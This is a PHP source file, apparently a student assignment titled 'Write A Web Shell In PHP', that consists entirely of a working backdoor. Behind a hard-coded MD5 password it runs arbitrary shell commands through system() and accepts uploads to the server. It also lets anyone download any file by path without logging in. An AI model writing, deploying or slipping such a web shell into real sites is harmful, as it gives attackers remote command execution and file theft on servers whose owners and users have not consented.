<?php
//Write A Web Shell In PHP
// Student ID:9ZALzGpIPDcHpU8JHzYdLrUnRnZ2
//
// A PHP backdoor
// Usage: http://www.example.com/backdoor.php
// Example: http://www.example.com/backdoor.php?download=secret.txt
//
// Define the password as a hash
$password = "5f4dcc3b5aa765d61d8327deb882cf99"; // md5 of "password"
// This is to verify password whether correct or not
if (isset($_POST['password']) && md5($_POST['password']) == $password) {
// To check if a command is provided
if (isset($_POST['command'])) {
// To execute the command and display the output
$command = $_POST['command'];
system($command);
}
// This is to check if a file is uploaded
if (isset($_FILES['file'])) {
// Moving the file to the web server
$file = $_FILES['file'];
$name = $file['name'];
$tmp_name = $file['tmp_name'];
move_uploaded_file($tmp_name, $name);

// Display a message when file is uploaded
echo "File uploaded: $name";
}
// This is tp display a form to enter the password, the command, and the file
echo "<form method='post' enctype='multipart/form-data'>";
echo "<input type='hidden' name='password' value='" . $_POST['password'] . "'>";
echo "<input type='text' name='command' placeholder='Enter a command'>";
echo "<input type='submit' value='Execute'>";
echo "<input type='file' name='file'>";
echo "<input type='submit' value='Upload'>";
echo "</form>";
} else {
// This it to check if a file download is requested
if (isset($_GET['download'])) {
// This is to get the file name and path
$file = $_GET['download'];
$path = getcwd() . "/" . $file;

// This checks if the file exists
if (file_exists($path)) {

  // This sets the headers for the file download
  header("Content-Type: application/octet-stream");
  header("Content-Disposition: attachment; filename=$file");
  header("Content-Length: " . filesize($path));

  // This reads and displays output the file
  readfile($path);

} else {

  // This displays an error message
  echo "File not found: $file";

}
} else {
// Code to display a form that allows a password to be entered
echo "<form method='post'>";
echo "<input type='password' name='password' placeholder='Enter the password'>";
echo "<input type='submit' value='Login'>";
echo "</form>";
}
}
?>